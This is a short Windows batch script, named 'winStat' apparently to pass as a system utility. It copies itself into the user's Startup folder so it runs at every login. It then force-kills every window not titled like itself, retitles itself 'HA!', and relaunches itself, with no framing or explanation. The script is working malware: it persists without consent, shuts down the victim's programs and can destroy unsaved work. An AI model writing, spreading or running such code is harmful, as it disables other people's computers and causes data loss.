@ECHO OFF
COLOR 0A
SET C=COPY
IF NOT EXIST "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat" (
%C% winStat.bat "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\winStat.bat"
)
TITLE winStat
taskkill /F /FI "WINDOWTITLE ne winStat"
TITLE HA!
taskkill /F /FI "WINDOWTITLE ne HA!"
START winStat.bat
